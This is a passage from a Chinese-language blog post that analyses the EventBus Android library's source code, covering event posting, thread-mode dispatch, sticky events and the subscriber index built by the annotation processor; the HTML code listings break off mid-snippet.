class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">private void postSingleEvent(Object event, PostingThreadState postingState) throws Error &#123;</span><br><span class="line">        Class&lt;?&gt; eventClass &#x3D; event.getClass();</span><br><span class="line">        boolean subscriptionFound &#x3D; false;</span><br><span class="line">        &#x2F;&#x2F; eventInheritance默认为true，表示是否向上查找事件的父类</span><br><span class="line">        if (eventInheritance) &#123;</span><br><span class="line">            &#x2F;&#x2F; 查找当前事件类型的Class，连同当前事件类型的Class保存到集合</span><br><span class="line">            List&lt;Class&lt;?&gt;&gt; eventTypes &#x3D; lookupAllEventTypes(eventClass);</span><br><span class="line">            int countTypes &#x3D; eventTypes.size();</span><br><span class="line">            &#x2F;&#x2F; 遍历Class集合，继续处理事件</span><br><span class="line">            for (int h &#x3D; 0; h &lt; countTypes; h++) &#123;</span><br><span class="line">                Class&lt;?&gt; clazz &#x3D; eventTypes.get(h);</span><br><span class="line">                subscriptionFound |&#x3D; postSingleEventForEventType(event, postingState, clazz);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            subscriptionFound &#x3D; postSingleEventForEventType(event, postingState, eventClass);</span><br><span class="line">        &#125;</span><br><span class="line">        if (!subscriptionFound) &#123;</span><br><span class="line">            if (logNoSubscriberMessages) &#123;</span><br><span class="line">                logger.log(Level.FINE, &quot;No subscribers registered for event &quot; + eventClass);</span><br><span class="line">            &#125;</span><br><span class="line">            if (sendNoSubscriberEvent &amp;&amp; eventClass !&#x3D; NoSubscriberEvent.class &amp;&amp;</span><br><span class="line">                    eventClass !&#x3D; SubscriberExceptionEvent.class) &#123;</span><br><span class="line">                post(new NoSubscriberEvent(this, event));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>postSingleEvent()方法中，根据eventInheritance属性，决定是否向上遍历事件的父类型，然后用postSingleEventForEventType()方法进一步处理事件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">private boolean postSingleEventForEventType(Object event, PostingThreadState postingState, Class&lt;?&gt; eventClass) &#123;</span><br><span class="line">        CopyOnWriteArrayList&lt;Subscription&gt; subscriptions;</span><br><span class="line">        synchronized (this) &#123;</span><br><span class="line">            &#x2F;&#x2F; 获取事件类型对应的Subscription集合</span><br><span class="line">            subscriptions &#x3D; subscriptionsByEventType.get(eventClass);</span><br><span class="line">        &#125;</span><br><span class="line">        &#x2F;&#x2F; 如果已订阅了对应类型的事件</span><br><span class="line">        if (subscriptions !&#x3D; null &amp;&amp; !subscriptions.isEmpty()) &#123;</span><br><span class="line">            for (Subscription subscription : subscriptions) &#123;</span><br><span class="line">                &#x2F;&#x2F; 记录事件</span><br><span class="line">                postingState.event &#x3D; event;</span><br><span class="line">                &#x2F;&#x2F; 记录对应的subscription</span><br><span class="line">                postingState.subscription &#x3D; subscription;</span><br><span class="line">                boolean aborted &#x3D; false;</span><br><span class="line">                try &#123;</span><br><span class="line">                    &#x2F;&#x2F; 最终的事件处理</span><br><span class="line">                    postToSubscription(subscription, event, postingState.isMainThread);</span><br><span class="line">                    aborted &#x3D; postingState.canceled;</span><br><span class="line">                &#125; finally &#123;</span><br><span class="line">                    postingState.event &#x3D; null;</span><br><span class="line">                    postingState.subscription &#x3D; null;</span><br><span class="line">                    postingState.canceled &#x3D; false;</span><br><span class="line">                &#125;</span><br><span class="line">                if (aborted) &#123;</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            return true;</span><br><span class="line">        &#125;</span><br><span class="line">        return false;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以发现，postSingleEventForEventType()方法核心就是遍历发送的事件类型对应的Subscription集合，然后调用postToSubscription()方法处理事件。</p><h2 id="处理事件"><a href="#处理事件" class="headerlink" title="处理事件"></a>处理事件</h2><p>接着上面的postToSubscription()方法，postToSubscription()内部会根据订阅事件方法的线程模式，间接或直接的以发送的事件为参数，通过反射执行订阅事件的方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">private void postToSubscription(Subscription subscription, Object event, boolean isMainThread) &#123;</span><br><span class="line">        &#x2F;&#x2F; 判断订阅事件方法的线程模式</span><br><span class="line">        switch (subscription.subscriberMethod.threadMode) &#123;</span><br><span class="line">            &#x2F;&#x2F; 默认的线程模式，在那个线程发送事件就在那个线程处理事件</span><br><span class="line">            case POSTING:</span><br><span class="line">                invokeSubscriber(subscription, event);</span><br><span class="line">                break;</span><br><span class="line">            &#x2F;&#x2F; 在主线程处理事件</span><br><span class="line">            case MAIN:</span><br><span class="line">                &#x2F;&#x2F; 如果在主线程发送事件，则直接在主线程通过反射处理事件</span><br><span class="line">                if (isMainThread) &#123;</span><br><span class="line">                    invokeSubscriber(subscription, event);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                     &#x2F;&#x2F; 如果是在子线程发送事件，则将事件入队列，通过Handler切换到主线程执行处理事件</span><br><span class="line">                    &#x2F;&#x2F; mainThreadPoster 不为空</span><br><span class="line">                    mainThreadPoster.enqueue(subscription, event);</span><br><span class="line">                &#125;</span><br><span class="line">                break;</span><br><span class="line">            &#x2F;&#x2F; 无论在那个线程发送事件，都先将事件入队列，然后通过 Handler 切换到主线程，依次处理事件。</span><br><span class="line">            &#x2F;&#x2F; mainThreadPoster 不为空</span><br><span class="line">            case MAIN_ORDERED:</span><br><span class="line">                if (mainThreadPoster !&#x3D; null) &#123;</span><br><span class="line">                    mainThreadPoster.enqueue(subscription, event);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    invokeSubscriber(subscription, event);</span><br><span class="line">                &#125;</span><br><span class="line">                break;</span><br><span class="line">            case BACKGROUND:</span><br><span class="line">                &#x2F;&#x2F; 如果在主线程发送事件，则先将事件入队列，然后通过线程池依次处理事件</span><br><span class="line">                if (isMainThread) &#123;</span><br><span class="line">                    backgroundPoster.enqueue(subscription, event);</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    &#x2F;&#x2F; 如果在子线程发送事件，则直接在发送事件的线程通过反射处理事件</span><br><span class="line">                    invokeSubscriber(subscription, event);</span><br><span class="line">                &#125;</span><br><span class="line">                break;</span><br><span class="line">            &#x2F;&#x2F; 无论在那个线程发送事件，都将事件入队列，然后通过线程池处理。</span><br><span class="line">            case ASYNC:</span><br><span class="line">                asyncPoster.enqueue(subscription, event);</span><br><span class="line">                break;</span><br><span class="line">            default:</span><br><span class="line">                throw new IllegalStateException(&quot;Unknown thread mode: &quot; + subscription.subscriberMethod.threadMode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到，postToSubscription()方法就是根据订阅事件方法的线程模式、以及发送事件的线程来判断如何处理事件，至于处理方式主要有两种：一种是在相应线程直接通过invokeSubscriber()方法，用反射来执行订阅事件的方法，这样发送出去的事件就被订阅者接收并做相应处理了。 首先，我们来看一下invokeSubscriber()方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">void invokeSubscriber(Subscription subscription, Object event) &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            subscription.subscriberMethod.method.invoke(subscription.subscriber, event);</span><br><span class="line">        &#125; catch (InvocationTargetException e) &#123;</span><br><span class="line">            handleSubscriberException(subscription, event, e.getCause());</span><br><span class="line">        &#125; catch (IllegalAccessException e) &#123;</span><br><span class="line">            throw new IllegalStateException(&quot;Unexpected exception&quot;, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果在子线程发送事件，则直接在发送事件的线程通过反射处理事件。 另外一种是先将事件入队列（其实底层是一个List），然后做进一步处理，我们以mainThreadPoster.enqueue(subscription, event)为例简单的分析下，其中mainThreadPoster是HandlerPoster类的一个实例。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">public class HandlerPoster extends Handler implements Poster &#123;</span><br><span class="line">    private final PendingPostQueue queue;</span><br><span class="line">    private boolean handlerActive;</span><br><span class="line">    ......</span><br><span class="line">    public void enqueue(Subscription subscription, Object event) &#123;</span><br><span class="line">        &#x2F;&#x2F; 用subscription和event封装一个PendingPost对象</span><br><span class="line">        PendingPost pendingPost &#x3D; PendingPost.obtainPendingPost(subscription, event);</span><br><span class="line">        synchronized (this) &#123;</span><br><span class="line">            &#x2F;&#x2F; 入队列</span><br><span class="line">            queue.enqueue(pendingPost);</span><br><span class="line">            if (!handlerActive) &#123;</span><br><span class="line">                handlerActive &#x3D; true;</span><br><span class="line">                &#x2F;&#x2F; 发送开始处理事件的消息，handleMessage()方法将被执行，完成从子线程到主线程的切换</span><br><span class="line">                if (!sendMessage(obtainMessage())) &#123;</span><br><span class="line">                    throw new EventBusException(&quot;Could not send handler message&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public void handleMessage(Message msg) &#123;</span><br><span class="line">        boolean rescheduled &#x3D; false;</span><br><span class="line">        try &#123;</span><br><span class="line">            long started &#x3D; SystemClock.uptimeMillis();</span><br><span class="line">            &#x2F;&#x2F; 死循环遍历队列</span><br><span class="line">            while (true) &#123;</span><br><span class="line">                &#x2F;&#x2F; 出队列</span><br><span class="line">                PendingPost pendingPost &#x3D; queue.poll();</span><br><span class="line">                ......</span><br><span class="line">                &#x2F;&#x2F; 进一步处理pendingPost</span><br><span class="line">                eventBus.invokeSubscriber(pendingPost);</span><br><span class="line">                ......</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; finally &#123;</span><br><span class="line">            handlerActive &#x3D; rescheduled;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以发现，HandlerPoster的enqueue()方法主要就是将subscription、event对象封装成一个PendingPost对象，然后保存到队列里，之后通过Handler切换到主线程，在handleMessage()方法将中将PendingPost对象循环出队列，交给invokeSubscriber()方法做进一步处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">void invokeSubscriber(PendingPost pendingPost) &#123;</span><br><span class="line">        Object event &#x3D; pendingPost.event;</span><br><span class="line">        Subscription subscription &#x3D; pendingPost.subscription;</span><br><span class="line">        &#x2F;&#x2F; 释放pendingPost引用的资源</span><br><span class="line">        PendingPost.releasePendingPost(pendingPost);</span><br><span class="line">        if (subscription.active) &#123;</span><br><span class="line">            &#x2F;&#x2F; 用反射来执行订阅事件的方法</span><br><span class="line">            invokeSubscriber(subscription, event);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>invokeSubscriber方法比较简单，主要就是从pendingPost中取出之前保存的event、subscription，然后用反射来执行订阅事件的方法，又回到了第一种处理方式。所以mainThreadPoster.enqueue(subscription, event)的核心就是先将将事件入队列，然后通过Handler从子线程切换到主线程中去处理事件。</p><p>backgroundPoster.enqueue()和asyncPoster.enqueue也类似，内部都是先将事件入队列，然后再出队列，但是会通过线程池去进一步处理事件。</p><h2 id="粘性事件"><a href="#粘性事件" class="headerlink" title="粘性事件"></a>粘性事件</h2><p>一般情况，我们使用 EventBus 都是准备好订阅事件的方法，然后注册事件，最后在发送事件，即要先有事件的接收者。但粘性事件却恰恰相反，我们可以先发送事件，后续再准备订阅事件的方法、注册事件。</p><p>首先，我们看一下EventBus的粘性事件是如何使用的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EventBus.getDefault().postSticky(&quot;Hello World!&quot;);</span><br></pre></td></tr></table></figure><p>粘性事件使用了postSticky()方法，postSticky()方法的源码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">public void postSticky(Object event) &#123;</span><br><span class="line">        synchronized (stickyEvents) &#123;</span><br><span class="line">            stickyEvents.put(event.getClass(), event);</span><br><span class="line">        &#125;</span><br><span class="line">        post(event);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>postSticky()方法主要做了两件事：先将事件类型和对应事件保存到stickyEvents中，方便后续使用；然后执行post(event)继续发送事件，这个post()方法就是之前发送的post()方法。所以，如果在发送粘性事件前，已经有了对应类型事件的订阅者，及时它是非粘性的，依然可以接收到发送出的粘性事件。</p><p>发送完粘性事件后，再准备订阅粘性事件的方法，并完成注册。核心的注册事件流程还是我们之前的register()方法中的subscribe()方法，前边分析subscribe()方法时，有一段没有分析的代码，就是用来处理粘性事件的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">private void subscribe(Object subscriber, SubscriberMethod subscriberMethod) &#123;</span><br><span class="line">        ......</span><br><span class="line">        ......</span><br><span class="line">        ......</span><br><span class="line">        &#x2F;&#x2F; 如果当前订阅事件的方法的Subscribe注解的sticky属性为true，即该方法可接受粘性事件</span><br><span class="line">        if (subscriberMethod.sticky) &#123;</span><br><span class="line">            &#x2F;&#x2F; 默认为true，表示是否向上查找事件的父类</span><br><span class="line">            if (eventInheritance) &#123;</span><br><span class="line">                &#x2F;&#x2F; stickyEvents就是发送粘性事件时，保存了事件类型和对应事件</span><br><span class="line">                Set&lt;Map.Entry&lt;Class&lt;?&gt;, Object&gt;&gt; entries &#x3D; stickyEvents.entrySet();</span><br><span class="line">                for (Map.Entry&lt;Class&lt;?&gt;, Object&gt; entry : entries) &#123;</span><br><span class="line">                    Class&lt;?&gt; candidateEventType &#x3D; entry.getKey();</span><br><span class="line">                    &#x2F;&#x2F; 如果candidateEventType是eventType的子类或</span><br><span class="line">                    if (eventType.isAssignableFrom(candidateEventType)) &#123;</span><br><span class="line">                        &#x2F;&#x2F; 获得对应的事件</span><br><span class="line">                        Object stickyEvent &#x3D; entry.getValue();</span><br><span class="line">                        &#x2F;&#x2F; 处理粘性事件</span><br><span class="line">                        checkPostStickyEventToSubscription(newSubscription, stickyEvent);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                Object stickyEvent &#x3D; stickyEvents.get(eventType);</span><br><span class="line">                checkPostStickyEventToSubscription(newSubscription, stickyEvent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到，处理粘性事件就是在 EventBus 注册时，遍历stickyEvents，如果当前要注册的事件订阅方法是粘性的，并且该方法接收的事件类型和stickyEvents中某个事件类型相同或者是其父类，则取出stickyEvents中对应事件类型的具体事件，做进一步处理。</p><p>subscribe()方法最核心的就是checkPostStickyEventToSubscription()方法。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private void checkPostStickyEventToSubscription(Subscription newSubscription, Object stickyEvent) &#123;</span><br><span class="line">        if (stickyEvent !&#x3D; null) &#123;</span><br><span class="line">            postToSubscription(newSubscription, stickyEvent, isMainThread());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="Subscriber-索引"><a href="#Subscriber-索引" class="headerlink" title="Subscriber 索引"></a>Subscriber 索引</h2><p>回顾上面对 EventBus 注册事件流程的分析，EventBus主要是在项目运行时通过反射来查找订事件的方法信息，如果项目中有大量的订阅事件的方法，必然会对项目运行时的性能产生影响。其实除了在项目运行时通过反射查找订阅事件的方法信息，EventBus 还提供了在项目编译时通过注解处理器查找订阅事件方法信息的方式，生成一个辅助的索引类来保存这些信息，这个索引类就是Subscriber Index，和 ButterKnife 的原理是类似的。</p><p>所以，我们在添加EventBus依赖的时候通常是下面这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dependencies &#123;</span><br><span class="line">    compile &#39;org.greenrobot:eventbus:3.1.1&#39;</span><br><span class="line">    &#x2F;&#x2F; 引入注解处理器</span><br><span class="line">    annotationProcessor &#39;org.greenrobot:eventbus-annotation-processor:3.1.1&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在项目的 Application 中添加如下配置，可以生成一个默认的 EventBus 单例。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">EventBus.builder().addIndex(new MyEventBusIndex()).installDefaultEventBus();</span><br></pre></td></tr></table></figure><h4 id="索引生成"><a href="#索引生成" class="headerlink" title="索引生成"></a>索引生成</h4><p>addIndex方法 ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public EventBusBuilder addIndex(SubscriberInfoIndex index) &#123;</span><br><span class="line">    if(subscriberInfoIndexes &#x3D;&#x3D; null) &#123;</span><br><span class="line">        subscriberInfoIndexes &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    subscriberInfoIndexes.add(index);</span><br><span class="line">    return this;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，传进来的索引信息会保存在subscriberInfoIndexes这个List中，后续会通过EventBusBuilder传到相应EventBus的SubscriberMethodFinder实例中。我们先来分析SubscriberInfoIndex这个参数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public interface SubscriberInfoIndex &#123;</span><br><span class="line">    SubscriberInfo getSubscriberInfo(Class&lt;?&gt; subscriberClass);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可见索引只需要做一件事情——就是能拿到订阅者的信息。而实现这个接口的类如果我们没有编译过，是找不到的。这里就得看我们在一开始在配置gradle时导入的EventBusAnnotationProcessor：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">@SupportedAnnotationTypes(&quot;org.greenrobot.eventbus.Subscribe&quot;)</span><br><span class="line">@SupportedOptions(value &#x3D; &#123;&quot;eventBusIndex&quot;, &quot;verbose&quot;&#125;)</span><br><span class="line">public class EventBusAnnotationProcessor extends AbstractProcessor &#123;</span><br><span class="line">    &#x2F;** Found subscriber methods for a class (without superclasses). 被注解表示的方法信息 *&#x2F; </span><br><span class="line">    private final ListMap&lt;TypeElement, ExecutableElement&gt; methodsByClass &#x3D; new ListMap&lt;&gt;();</span><br><span class="line">    private final Set&lt;TypeElement&gt; classesToSkip &#x3D; new HashSet&lt;&gt;(); &#x2F;&#x2F; checkHasErrors检查出来的异常方法</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public boolean process(Set&lt;? extends TypeElement&gt; annotations, RoundEnvironment env) &#123;</span><br><span class="line">        Messager messager &#x3D; processingEnv.getMessager();</span><br><span class="line">        try &#123;</span><br><span class="line">            String index &#x3D; processingEnv.getOptions().get(OPTION_EVENT_BUS_INDEX);</span><br><span class="line">            if (index &#x3D;&#x3D; null) &#123; &#x2F;&#x2F; 如果没有在gradle中配置apt的argument，编译就会在这里报错</span><br><span class="line">                messager.printMessage(Diagnostic.Kind.ERROR, &quot;No option &quot; + OPTION_EVENT_BUS_INDEX +</span><br><span class="line">                        &quot; passed to annotation processor&quot;);</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">            &#x2F;** ... *&#x2F;</span><br><span class="line">            collectSubscribers(annotations, env, messager); &#x2F;&#x2F; 根据注解拿到所有订阅者的回调方法信息</span><br><span class="line">            checkForSubscribersToSkip(messager, indexPackage); &#x2F;&#x2F; 筛掉不符合规则的订阅者</span><br><span class="line">            if (!methodsByClass.isEmpty()) &#123;</span><br><span class="line">                createInfoIndexFile(index); &#x2F;&#x2F; 生成索引类</span><br><span class="line">            &#125; </span><br><span class="line">            &#x2F;** 打印错误 *&#x2F;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#x2F;** 下面这些方法就不再贴出具体实现了，我们了解它们的功能就行 *&#x2F;</span><br><span class="line">    private void collectSubscribers &#x2F;&#x2F; 遍历annotations，找出所有被注解标识的方法，以初始化methodsByClass</span><br><span class="line">    private boolean checkHasNoErrors &#x2F;&#x2F; 过滤掉static，非public和参数大于1的方法</span><br><span class="line">    private void checkForSubscribersToSkip &#x2F;&#x2F; 检查methodsByClass中的各个类，是否存在非public的父类和方法参数</span><br><span class="line">    &#x2F;** 下面这三个方法会把methodsByClass中的信息写到相应的类中 *&#x2F;</span><br><span class="line">    private void writeCreateSubscriberMethods</span><br><span class="line">    private void createInfoIndexFile</span><br><span class="line">    private void writeIndexLines</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此便揭开了索引生成的秘密，是在编译时apt插件通过EventBusAnnotationProcessor分析注解，并利用注解标识的相关类的信息去生成相关的类。writeCreateSubscriberMethods中调用了很多IO函数，很容易理解，这里就不贴了，我们直接看生成出来的类：<br>其中，MyEventBusIndex()方法的源码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">public class MyEventBusIndex implements SubscriberInfoIndex &#123;</span><br><span class="line">    private static final Map&lt;Class&lt;?&gt;, SubscriberInfo&gt; SUBSCRIBER_INDEX;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        SUBSCRIBER_INDEX &#x3D; new HashMap&lt;Class&lt;?&gt;, SubscriberInfo&gt;();</span><br><span class="line"></span><br><span class="line">        putIndex(new SimpleSubscriberInfo(MainActivity.class, true, new SubscriberMethodInfo[] &#123;</span><br><span class="line">            new SubscriberMethodInfo(&quot;changeText&quot;, String.class),</span><br><span class="line">        &#125;));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private static void putIndex(SubscriberInfo info) &#123;</span><br><span class="line">        SUBSCRIBER_INDEX.put(info.getSubscriberClass(), info);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public SubscriberInfo getSubscriberInfo(Class&lt;?&gt; subscriberClass) &#123;</span><br><span class="line">        SubscriberInfo info &#x3D; SUBSCRIBER_INDEX.get(subscriberClass);</span><br><span class="line">        if (info !&#x3D; null) &#123;</span><br><span class="line">            return info;</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            return null;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中SUBSCRIBER_INDEX是一个HashMap，保存了当前注册类的 Class 类型和其中事件订阅方法的信息。</p><h4 id="Subscribes-索引注册流程"><a href="#Subscribes-索引注册流程" class="headerlink" title="Subscribes 索引注册流程"></a>Subscribes 索引注册流程</h4><p>接下来，我们再来分析下使用 Subscriber 索引时 EventBus 的注册流程。首先，创建一个EventBusBuilder，然后通过addIndex()方法添加索引类的实例。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">public EventBusBuilder addIndex(SubscriberInfoIndex index) &#123;</span><br><span class="line">        if (subscriberInfoIndexes &#x3D;&#x3D; null) &#123;</span><br><span class="line">            subscriberInfoIndexes &#x3D; new ArrayList&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        subscriberInfoIndexes.add(index);</span><br><span class="line">        return this;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>即把生成的索引类的实例保存在subscriberInfoIndexes集合中，然后用installDefaultEventBus()创建默认的 EventBus实例。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public EventBus installDefaultEventBus() &#123;</span><br><span class="line">        synchronized (EventBus.class) &#123;</span><br><span class="line">            if (EventBus.defaultInstance !&#x3D; null) &#123;</span><br><span class="line">                throw new EventBusException(&quot;Default instance already exists.&quot; 